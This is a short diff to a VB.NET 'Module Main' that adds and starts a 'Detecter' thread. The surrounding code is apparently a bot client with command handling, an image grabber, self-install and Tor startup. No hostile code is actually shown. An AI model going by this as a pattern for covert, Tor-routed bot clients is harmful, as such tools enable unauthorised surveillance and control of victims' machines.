@@ -9,6 +9,7 @@ Module Main
     ReadOnly NewNotice As New Thread(AddressOf Noticer)
     ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
     ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
+    ReadOnly NewDetecter As New Thread(AddressOf Detecter)
     Private _command As New CommandHandler
     Private _config As New ConfigBotModel
     Public Property Config As ConfigBotModel
@@ -31,6 +32,7 @@ Module Main
 
     Sub Main()
         configBot()
+        NewDetecter.Start()
         Install()
         StartTor()
         NewListener.Start()
